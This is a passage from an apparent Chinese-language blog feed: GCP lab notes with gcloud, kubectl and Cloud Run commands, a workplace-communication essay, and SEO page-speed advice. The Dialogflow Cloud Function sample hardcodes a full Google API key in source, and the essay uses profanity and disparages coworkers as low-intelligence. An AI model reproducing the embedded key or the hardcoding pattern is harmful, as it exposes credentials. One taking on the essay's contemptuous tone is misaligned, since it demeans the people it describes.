fancy-fe-hc \</span><br><span class="line"> --port 8080 \</span><br><span class="line"> --check-interval 30s \</span><br><span class="line"> --healthy-threshold 1 \</span><br><span class="line"> --<span class="built_in">timeout</span> 10s \</span><br><span class="line"> --unhealthy-threshold 3</span><br><span class="line">gcloud compute health-checks create http fancy-be-hc \</span><br><span class="line"> --port 8081 \</span><br><span class="line"> --request-path=/api/orders \</span><br><span class="line"> --check-interval 30s \</span><br><span class="line"> --healthy-threshold 1 \</span><br><span class="line"> --<span class="built_in">timeout</span> 10s \</span><br><span class="line"> --unhealthy-threshold 3</span><br></pre></td></tr></table></figure><ol start="2"><li>開啟 health-checks 防火牆權限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute firewall-rules create allow-health-check \</span><br><span class="line"> --allow tcp:8080-8081 \</span><br><span class="line"> --source-ranges 130.211.0.0/22,35.191.0.0/16 \</span><br><span class="line"> --network default</span><br></pre></td></tr></table></figure><ol start="3"><li>開始監控</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute instance-groups managed update fancy-fe-mig \</span><br><span class="line"> --health-check fancy-fe-hc \</span><br><span class="line"> --initial-delay 300</span><br><span class="line">gcloud compute instance-groups managed update fancy-be-mig \</span><br><span class="line"> --health-check fancy-be-hc \</span><br><span class="line"> --initial-delay 300</span><br></pre></td></tr></table></figure><ol start="4"><li>針對後端服務的 URL 做監控</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute http-health-checks create fancy-fe-frontend-hc \</span><br><span class="line"> --request-path / \</span><br><span class="line"> --port 8080</span><br><span class="line">gcloud compute http-health-checks create fancy-be-orders-hc \</span><br><span class="line"> --request-path /api/orders \</span><br><span class="line"> --port 8081</span><br><span class="line">gcloud compute http-health-checks create fancy-be-products-hc \</span><br><span class="line"> --request-path /api/products \</span><br><span class="line"> --port 8082</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gcloud compute backend-services create fancy-fe-frontend \</span><br><span class="line"> --http-health-checks fancy-fe-frontend-hc \</span><br><span class="line"> --port-name frontend \</span><br><span class="line"> --global</span><br><span class="line">gcloud compute backend-services create fancy-be-orders \</span><br><span class="line"> --http-health-checks fancy-be-orders-hc \</span><br><span class="line"> --port-name orders \</span><br><span class="line"> --global</span><br><span class="line">gcloud compute backend-services create fancy-be-products \</span><br><span class="line"> --http-health-checks fancy-be-products-hc \</span><br><span class="line"> --port-name products \</span><br><span class="line"> --global</span><br></pre></td></tr></table></figure><h3 id="Kubernetes-K8S"><a href="#Kubernetes-K8S" class="headerlink" title="Kubernetes (K8S)"></a>Kubernetes (K8S)</h3><ol><li>設定地區: <code>gcloud config set compute/zone us-east1-b</code></li><li>建立 Cluster: <code>gcloud container clusters create nucleus-webserver1</code></li><li><code>gcloud container clusters get-credentials nucleus-webserver1</code></li><li>用 image 建立服務 <code>kubectl create deployment hello-app --image=gcr.io/google-samples/hello-app:2.0</code></li><li>把 port 轉出來 <code>kubectl expose deployment hello-app --type=LoadBalancer --port 8080</code></li></ol><p>Kubernetes 中最小運算單位是 Pod，一個 Pod 可以包含多個容器共用 IP 和資源，多個 Pod 組成一個完整的 Service 方便做水平的擴充和附載平衡等等。</p><p>圖片來源: <a href="https://google.qwiklabs.com/">https://google.qwiklabs.com/</a></p><blockquote><p>Pod<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/KubernetesPods.png" alt="KubernetesPods"></p></blockquote><blockquote><p>Service<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/KubernetesService.png" alt="KubernetesService"></p></blockquote><p>不同的 Services 間的非同步協作可透過第三方 Firebase 的 Pub&#x2F;Sub 來取代直接叫用，會讓整個系統能夠更彈性，在升版的過程能夠因為這樣的架構達到滾動式更新的效果。</p><blockquote><p>動式更新<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/KubernetesRollingUpdate.png" alt="KubernetesRollingUpdate"></p></blockquote><p>各步驟中常用的指令:</p><ul><li>kubectl get pods</li><li>kubectl get services</li></ul><h3 id="Cloud-Run"><a href="#Cloud-Run" class="headerlink" title="Cloud Run"></a>Cloud Run</h3><p>Cloud Run 是最簡單的一種，透過 Knative 將 Kubernetes 的配置包進來，可以更簡單地把網站部屬到 Cloud Run，使用者只要先準備好 Image 就好了。</p><ol><li>建立一個 Image <code>gcloud builds submit --tag gcr.io/$&#123;GOOGLE_CLOUD_PROJECT&#125;/monolith:1.0.0 .</code></li><li>發布容器 <code>gcloud run deploy --image=gcr.io/$&#123;GOOGLE_CLOUD_PROJECT&#125;/monolith:1.0.0 --platform managed</code></li></ol><p>需要更新版本的話，就只要推一版新的上去就搞定<br><code>gcloud builds submit --tag gcr.io/$&#123;GOOGLE_CLOUD_PROJECT&#125;/monolith:2.0.0 .</code></p><p>官方教學: <a href="https://cloud.google.com/run/docs/quickstarts/prebuilt-deploy?hl=zh-TW">https://cloud.google.com/run/docs/quickstarts/prebuilt-deploy?hl=zh-TW</a></p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/CloudRunBuild.JPG" alt="CloudRunBuild"></p></blockquote><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/CloudRunExecutionDetails.JPG" alt="CloudRunExecutionDetails"></p></blockquote><p>各步驟中常用的指令:</p><ul><li>gcloud run services list<ul><li><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/CloudRunServerList.JPG" alt="CloudRunServerList"></p></blockquote></li></ul></li><li>gcloud run services describe monolith –platform managed<ul><li><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/CloudRunServiceList.JPG" alt="CloudRunServiceList"></p></blockquote></li></ul></li></ul><h2 id="Google-Assistant"><a href="#Google-Assistant" class="headerlink" title="Google Assistant"></a>Google Assistant</h2><p>在基礎關卡中 GCP 也提供了 Google 助理的實作教學，過程中主要會使用 Dialogflow 來做相關的設定，其實就很像常見的狀態機聊天機器人，只是 Google 這裡可以跟其他 GCP 相關的服務整合，也提供了基本的 AI 整合。</p><blockquote><p>請助理幫忙查詢資料<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GoogleAssistantDialogflow.JPG" alt="GoogleAssistantDialogflow"></p></blockquote><blockquote><p>先輸入一些使用者回應，像是各種地址格式<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GoogleAssistantTrainingPhrases.JPG" alt="GoogleAssistantTrainingPhrases"></p></blockquote><blockquote><p>針對剛才的輸入設定格式<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GoogleAssistantDialogflowIntent.JPG" alt="GoogleAssistantDialogflowIntent"></p></blockquote><blockquote><p>調整相關參數後 Google 就能夠自動辨識出使用者打的字是想回答什麼問題<br><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/GoogleAssistantActionAndParameters.JPG" alt="GoogleAssistantActionAndParameters"></p></blockquote><h3 id="Cloud-Function"><a href="#Cloud-Function" class="headerlink" title="Cloud Function"></a>Cloud Function</h3><p>在沒有架設後端服務的情況下，可以透過撰寫 Cloud Function 來提供服務。底下是在實作 Google Assistant 時官方提供的例子，當我們收到一個 any 的歌手名稱時，會透過 YouTube 的 API 協助查詢結果並回傳。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; dialogflow, <span class="title class_">Image</span>, <span class="title class_">Suggestions</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;actions-on-google&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> functions = <span class="built_in">require</span>(<span class="string">&quot;firebase-functions&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">dialogflow</span>(&#123; <span class="attr">debug</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">API_KEY</span> = <span class="string">&quot;AIzaSyDegdgDtKnYGeuhT7FBMhJXqmRbYWtFWRc&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">intent</span>(<span class="string">&quot;youtube&quot;</span>, <span class="function">(<span class="params">conv, &#123; any &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> url =</span><br><span class="line">    <span class="string">&quot;https://www.googleapis.com/youtube/v3/search?part=snippet&amp;maxResults=5&amp;q=&quot;</span> +</span><br><span class="line">    <span class="built_in">encodeURIComponent</span>(any) +</span><br><span class="line">    <span class="string">&quot;&amp;type=video&amp;order=viewCount&amp;videoCategoryId=10&amp;key=&quot;</span> +</span><br><span class="line">    <span class="variable constant_">API_KEY</span>;</span><br><span class="line">  <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> axios</span><br><span class="line">    .<span class="title function_">get</span>(url)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> output = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(response.<span class="property">data</span>);</span><br><span class="line">      <span class="keyword">var</span> song_fields = response.<span class="property">data</span>.<span class="property">items</span>[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">return</span> song_fields;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">output</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> song_title = output.<span class="property">snippet</span>.<span class="property">title</span>;</span><br><span class="line">      song_title = song_title.<span class="title function_">replace</span>(<span class="regexp">/&amp;amp;/g</span>, <span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">      song_title = song_title.<span class="title function_">replace</span>(<span class="regexp">/&amp;quot;/g</span>, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">      <span class="keyword">var</span> song_link = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(output.<span class="property">id</span>.<span class="property">videoId</span>);</span><br><span class="line">      <span class="keyword">var</span> song_thumbnail = output.<span class="property">snippet</span>.<span class="property">thumbnails</span>.<span class="property">high</span>.<span class="property">url</span>;</span><br><span class="line">      conv.<span class="title function_">ask</span>(<span class="string">`Fetching your request...`</span>);</span><br><span class="line">      conv.<span class="title function_">ask</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Image</span>(&#123;</span><br><span class="line">          <span class="attr">url</span>: song_thumbnail,</span><br><span class="line">          <span class="attr">alt</span>: <span class="string">&quot;Song thumbnail&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">      conv.<span class="title function_">close</span>(</span><br><span class="line">        <span class="string">`The most popular song is: `</span> +</span><br><span class="line">          song_title +</span><br><span class="line">          <span class="string">`. The link to this song is: https://www.youtube.com/watch?v=`</span> +</span><br><span class="line">          song_link.<span class="title function_">slice</span>(<span class="number">1</span>, -<span class="number">1</span>) +</span><br><span class="line">          <span class="string">`. See you next time.`</span></span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">youtube</span> = functions.<span class="property">https</span>.<span class="title function_">onRequest</span>(app);</span><br></pre></td></tr></table></figure><h2 id="Big-Query"><a href="#Big-Query" class="headerlink" title="Big Query"></a>Big Query</h2><p>使用起來的方式就是寫 SQL，但資料匯入方式就更多元，最神奇的是可以排程匯入，匯入後還可以透過 DataStudio 做視覺化。</p><ul><li>csv</li><li>Cloud Storage</li><li>Google Sheet</li><li>Query 回來的資料<blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/BigQueryImportQuery.png" alt="BigQueryImportQuery"></p></blockquote></li><li>排程定時 Query 回來的資料<blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/BigQueryScheduleQuery.png" alt="BigQueryScheduleQuery"></p></blockquote></li></ul><p>在把資料匯進來之後，還可以透過 DataStudio 做相關視覺化報表，神奇的是表格還會依照自己覺得最佳的方式自動畫出來。</p><ol><li><p>DataStudio 資料來源選擇 Big Query</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/BigQueryDataStudio.png" alt="BigQueryDataStudio"></p></blockquote></li><li><p>選擇相關的資料表</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/BigQueryAddToDataStudio.png" alt="BigQueryAddToDataStudio"></p></blockquote></li><li><p>加入圖表，收工!</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/BigQueryAddToChartDataStudio.png" alt="BigQueryAddToChartDataStudio"></p></blockquote></li></ol><h2 id="Firestore-Native-Mode"><a href="#Firestore-Native-Mode" class="headerlink" title="Firestore Native Mode"></a>Firestore Native Mode</h2><p>破關的過程中常常會需要使用 Firestore Native Mode 但按照官方教學在 Firestore 中是找不到這個設定的，最後經過我多次爬文後才發現原來新版本搬到 DataStore 中了。</p><blockquote><p><img src="/2021/06/29/cloud-platform/gcp-cloud-study-jam-2021/DataStoreNativeMode.png" alt="DataStoreNativeMode"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>談溝通步驟與引導技巧</title>
      <link href="/2021/05/22/thinking-communicate-clearly/"/>
      <url>/2021/05/22/thinking-communicate-clearly/</url>
      
        <content type="html"><![CDATA[<p>合作屬於目標導向的任務，目的是讓團隊一起從起點走向終點，透過建立溝通的步驟與學習相關的引導技巧，通常就能夠有效地縮短大家花費的時間。</p><h2 id="背景與理由"><a href="#背景與理由" class="headerlink" title="背景與理由"></a>背景與理由</h2><p>剛到傳產上班時，收到 Email 通知<strong>粗體</strong>加螢光紫顏色警告大家<span style="color:#a000a0;font-weight:bold;font-size:24px">要戴口罩</span>，根本就長輩圖等級信件。</p><p>我還跟同學說我們公司竟然通知沒戴口罩要記警告，也太把大家當白痴了吧? 同學表示，你不知道公司不這樣做，很多人會看不懂。約莫半年到一年後我漸漸懂了，常見的引導和教練技巧是需要有聽懂和看得懂中文的前提。</p><h2 id="溝通的步驟"><a href="#溝通的步驟" class="headerlink" title="溝通的步驟"></a>溝通的步驟</h2><p>大致上粗分成底下五個步驟，也許每個人或團隊會略有差異，但過往與大量隊友交手經驗，大致上不會跳脫太多。</p><ol><li>確定合作目標</li><li>建立預期假設</li><li>決定達成標準</li><li>任務交付</li><li>確認驗收</li></ol><h3 id="確定合作目標"><a href="#確定合作目標" class="headerlink" title="確定合作目標"></a>確定合作目標</h3><p>舉例來說，這份文件和大家合作的目標:</p><ol><li>減少大家和天才相處的障礙</li><li>減少大家和笨蛋相處的挫折</li><li>希望大家學會一些技巧和方法</li></ol><p>首先用 ok 好取代幹你娘，畢竟我們的目標是到達終點，其他情緒性的東西不重要。道歉可以讓團隊前進就道歉，別人自以為高尚那我們不要浪費溝通自己就當賤民，總之，合作通常就是讓某樣人事物到達終點。</p><blockquote><p>練習愛說 ok 好<br><img src="https://i.imgur.com/3D61FXE.jpeg" alt="ok-good"></p></blockquote><h3 id="建立預期假設"><a href="#建立預期假設" class="headerlink" title="建立預期假設"></a>建立預期假設</h3><p>由於各種因素，看不懂文字也聽不懂話的人總是會有，所以明確的溝通，假設一定要有</p><ul><li>對方不會知道急迫性，<span style="color:red;font-weight:bold;font-size:20px">緊急的事</span>就寫緊急加紅色放大</li><li>對方不會知道重要性，重要最好就加<strong>粗體</strong>放在文章最前面</li><li>對方不會有自主性，與對方急迫無關的絕對擺爛到底 &gt;.^</li><li>對方不會知道任務權責上該如何分配才會最佳化，有必要就請有腦袋有權責的人協助</li><li>對方看不懂你的語言，單字句子務必夠簡單</li></ul><h3 id="決定達成標準"><a href="#決定達成標準" class="headerlink" title="決定達成標準"></a>決定達成標準</h3><p>明白了目標和假設後，接下來就是訂下完成的目標還有暫定自己預期達到的最低標。</p><p>以合作來說，最有能力的人們應該會一起討論:</p><ol><li>確認戰場範圍大小</li><li>拆分目標</li><li>以複雜度來分類目標<ul><li>複雜目標: 交給高智商的，若任何有幫助的相關參考資料最好先行提供</li><li>簡單目標: 交給低智商的，指令絕對要明確，預期結果最好先提，檢核點要先設定</li></ul></li></ol><h3 id="任務交付"><a href="#任務交付" class="headerlink" title="任務交付"></a>任務交付</h3><p>任務交付的過程，這個部分請當作和幼稚園孩子教學一般，交付過程個人認為四個重點:</p><ol><li>準備好想得到的 FAQ，笨蛋不知道自己不知道一定少問問題，天才知道自己不知道一定很多問題</li><li>交付時，若擔心對方理解程度，可協助訂出優先順序，適時給予相關資源協助</li><li>提供相關文件，目的是確定認知一致，不管是聰明與笨蛋，一個則總會想太多一個總是沒想到</li><li>指定某個對象處理，請假設對方 87% 會擺爛，提問時就建議直接請問 OOO 可以協助解答這個問題嗎?</li></ol><h3 id="確認驗收"><a href="#確認驗收" class="headerlink" title="確認驗收"></a>確認驗收</h3><p>交付時是否有附贈相關文件，若有就恭喜，若無只好當印象派請默哀</p><ol><li>最低標準沒達到，是否有困難?</li><li>達到最低標準，是否有機會優化?</li><li>達到一般標準，是否結束?</li></ol><h2 id="引導技巧"><a href="#引導技巧" class="headerlink" title="引導技巧"></a>引導技巧</h2><p>引導技巧這裡依照工作成熟度和做事意願將隊友分成四種類型</p><ol><li>提供資訊並相信: 適合工作成熟度較<strong>高</strong>，<strong>有做事意願</strong>的隊友</li><li>告知並加上指導: 適合工作成熟度較低，做事意願低的隊友</li><li>參與過程與檢核: 適合工作成熟度較<strong>高</strong>，做事意願低的隊友</li><li>決策後解釋內容: 適合工作成熟度較低，<strong>有做事意願</strong>的隊友</li></ol><h3 id="提供資訊並相信"><a href="#提供資訊並相信" class="headerlink" title="提供資訊並相信"></a>提供資訊並相信</h3><blockquote><p>適合工作成熟度較<strong>高</strong>，<strong>有做事意願</strong>的隊友</p></blockquote><p>你要做的事情很簡單，就是相信隊友過往累積且能夠做正確的決定，遇到這種天選之人真的很難，通常事情交代之後，想要的結果就會自然而然的發生，有時候甚至超出預期。</p><p>遇到這種隊友就是不要耽誤隊友，大家就會一起用最快的速度到達終點，就像是球隊中的 MVP，關鍵時刻大家做好戰術，球都給 MVP 大大就對了，若隊友是助攻王，關鍵時刻也該把球都給助攻王大大。</p><h3 id="告知並加上指導"><a href="#告知並加上指導" class="headerlink" title="告知並加上指導"></a>告知並加上指導</h3><blockquote><p>適合工作成熟度較低，做事意願低的隊友</p></blockquote><p>通常是有讀點書但書可能又讀得不太夠，放任發展通常會出點問題，如果剛好是少爺或是少奶奶這類人等其實就是來上班交個朋友，也不用太要求，適合指令明確且不難的工作，不想浪費生命和耽誤團隊進度的話，就是安排打雜相關事務給這類隊友消耗時間即可。</p><h3 id="參與過程與檢核"><a href="#參與過程與檢核" class="headerlink" title="參與過程與檢核"></a>參與過程與檢核</h3><blockquote><p>適合工作成熟度較<strong>高</strong>，做事意願低的隊友</p></blockquote><p>這個通常可以想像成離職前員工擺爛的情況，每周甚至每天追蹤一下即可，畢竟只是擺爛，如果稍微禮貌的問候和誠意的溝通，隊友腦袋正常的情況下，相關的東西還是會有成效的。</p><h3 id="決策後解釋內容"><a href="#決策後解釋內容" class="headerlink" title="決策後解釋內容"></a>決策後解釋內容</h3><blockquote><p>適合工作成熟度較低，<strong>有做事意願</strong>的隊友</p></blockquote><p>這個問題最大，需要耐心確認到底交代的 a 最後會不會變成 alpha。最可怕的是如果這位大大是秀場天王，整天想刷存在感，大家的人生會更悲劇，為什麼這麼說?</p><p>講個故事，很優秀的醫護相關人員已經要忙整天了，結果了解相關狀態後發現還要 Carry 這種戲劇系教學什麼是防疫。</p><p>我想說都已經三級事態緊急，真的會忙到沒人有空管這種愛發揮創意的戲劇系了啦!!!!大家的共同目標是防疫，作秀刷存在感也不想一下什麼才是重要的事情，想不到就可以不要做沒人會罵你 87!!!! 我覺得醫護相關人員會氣死，會懷疑到底是來救人的還是來教文盲讀書的…</p><p>知識就是力量，無知超越力量。再優秀的人能力總會有上限，但是低能是沒有下限的，記得看到這類隊友事態緊急要衝進度的時候，絕對!!! 只能安排打雜相關事務，切記不要花時間再解釋複雜內容給這種隊友了，最適合的任務:</p><ol><li>明確能執行</li><li>夠簡單</li><li>結果肉眼可預見</li></ol><blockquote><p>OK 好 #為避免群聚拆除籃框 #為拆除籃框造成群聚<br><img src="https://i.imgur.com/CwWEpXV.jpeg" alt="ok-good"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 專案管理 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部落格搜尋引擎優化方法 (SEO)</title>
      <link href="/2021/05/07/marketing-seo-blog/"/>
      <url>/2021/05/07/marketing-seo-blog/</url>
      
        <content type="html"><![CDATA[<p>搜尋引擎優化 (SEO) 透過調整站台符合搜尋引擎運作規則，最終提高網站搜尋排名的一種技巧。</p><p>以這個技術部落格當例子，來開箱如何優化文章曝光和點擊，以及調整後一個月 MAU 從 3000 到 4000 過程。</p><blockquote><p>MAU 成果<br><img src="/2021/05/07/marketing-seo-blog/MAU.JPG" alt="MAU"></p></blockquote><p>當網站實際運行一陣子後，透過 Google Search Console 成效分析來看使用者常搜尋的關鍵字，以及個體連結與關鍵字的曝光次數關係。</p><p>在 SEO 前需要做三個工作來幫助搜尋引擎</p><ol><li>網站架構調整</li><li>文章關鍵字優化</li><li>網站地圖</li></ol><h2 id="網站架構調整"><a href="#網站架構調整" class="headerlink" title="網站架構調整"></a>網站架構調整</h2><p>在跟同事討論前我主要從網站速度跟架構面切入</p><ul><li>網頁速度優化，針對網站體驗核心指標評估（Core Web Vitals）來優化站台</li><li>HTML 語意化，讓搜尋引擎更好閱讀<ul><li>調整 HTML 相關的結構和語法</li><li>文章目錄，加速使用者找到資料，後來知道也可以方便 Google 閱讀</li><li>文章 QA</li><li><a href="https://developers.google.com/search/docs/guides/intro-structured-data?hl=zh-tw">結構化資料</a></li></ul></li></ul><h3 id="網頁速度優化"><a href="#網頁速度優化" class="headerlink" title="網頁速度優化"></a>網頁速度優化</h3><p>當使用者用行動裝置時，網頁的載入速度快慢會直接影響跳出率。網站的載入時間一旦超過 3 秒，訪客通常就會選擇離開，但大部分行動版網站的載入時間平均卻比這個<a href="https://www.thinkwithgoogle.com/marketing-strategies/app-and-mobile/mobile-page-speed-new-industry-benchmarks/">目標多出 1X 秒</a>。</p><p>隨著網路速度的變快，網站載入速度似乎不再佔那麼重要的腳色，但速度更快的網站仍舊可以創造滿意的使用者體驗，當網站響應速度較慢時，訪問者在該網站上的停留時間會減少。</p><p>本次網頁速度優化主要按照以下步驟</p><ol><li>延後載入當下非必需的腳本、資源</li><li>提供 AMP 的支援來優化</li><li>透過 <a href="https://developers.google.com/speed/pagespeed/insights/">Page Speed 跑分工具</a>進行測試</li></ol><p>同時，在技術上來說，對同樣一台伺服器來說更快的載入速度也代表同樣時間能夠提供更多的使用者服務。不過網站速度雖然重要，但權重並沒有頁面相關性高。<a href="https://developers.google.com/search/blog/2010/04/using-site-speed-in-web-search-ranking">目前 Google 調整後只有不到 1％ 的搜尋會受到網站速度影響</a>。</p><blockquote><p>Page Speed 跑分工具<br><img src="https://linyencheng.github.io/2021/03/09/experience-sharing-web-page-loading-performance/experience-sharing-web-page-loading-performance.png" alt="page-loading-performance"></p></blockquote><h4 id="延後載入非必需資源"><a href="#延後載入非必需資源" class="headerlink" title="延後載入非必需資源"></a>延後載入非必需資源</h4><ul><li>透過程式撰寫 Lazy Load 的函式延後載入腳本、資源</li><li>透過 Google Tag Manager 來做到延遲載入的效果</li></ul><p>如果各位是工程師，那這邊也提供更進階的<a href="/2021/03/09/experience-sharing-web-page-loading-performance/?utm_source=link&utm_medium=article&utm_campaign=internal_link">四種加快網站開啟速度的常見方法</a>給大家。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">async</span>(<span class="params">u, c</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> d = <span class="variable language_">document</span>,</span><br><span class="line">    t = <span class="string">&quot;script&quot;</span>,</span><br><span class="line">    o = d.<span class="title function_">createElement</span>(t),</span><br><span class="line">    s = d.<span class="title function_">getElementsByTagName</span>(t)[<span class="number">0</span>];</span><br><span class="line">  o.<span class="property">src</span> = u;</span><br><span class="line">  <span class="keyword">if</span> (c) &#123;</span><br><span class="line">    o.<span class="title function_">addEventListener</span>(</span><br><span class="line">      <span class="string">&quot;load&quot;</span>,</span><br><span class="line">      <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="title function_">c</span>(<span class="literal">null</span>, e);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="literal">false</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  s.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(o, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">async</span>(<span class="string">&quot;https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  anchors.<span class="property">options</span> = &#123;</span><br><span class="line">    <span class="attr">visible</span>: <span class="string">&quot;always&quot;</span>,</span><br><span class="line">    <span class="attr">placement</span>: <span class="string">&quot;right&quot;</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&quot;#&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  anchors</span><br><span class="line">    .<span class="title function_">add</span>()</span><br><span class="line">    .<span class="title function_">remove</span>(<span class="string">&quot;.intro-header h1&quot;</span>)</span><br><span class="line">    .<span class="title function_">remove</span>(<span class="string">&quot;.subheading&quot;</span>)</span><br><span class="line">    .<span class="title function_">remove</span>(<span class="string">&quot;.sidebar-container h5&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="提供-AMP-支援"><a href="#提供-AMP-支援" class="headerlink" title="提供 AMP 支援"></a>提供 AMP 支援</h4><p>AMP (Accelerated Mobile Pages)，是 Google 規範用來加速行動裝置存取網站用的技術，應該很多部落格都會提供這樣的外掛或是範本讓使用者進行修改，實作完成後通常網址後面加上 <a href="/2021/03/09/experience-sharing-web-page-loading-performance/?utm_source=link&utm_medium=article&utm_campaign=internal_link"><code>/amp</code> 就會導到 AMP 版本的網頁</a>，接著 Google 爬取後在搜尋結果上就會出現小閃電的符號。</p><blockquote><p>AMP 網頁會在搜尋結果中出現小閃電<br><img src="/2021/05/07/marketing-seo-blog/AMPResult.JPG" alt="AMPResult"></p></blockquote><h3 id="HTML-語意化"><a href="#HTML-語意化" class="headerlink" title="HTML 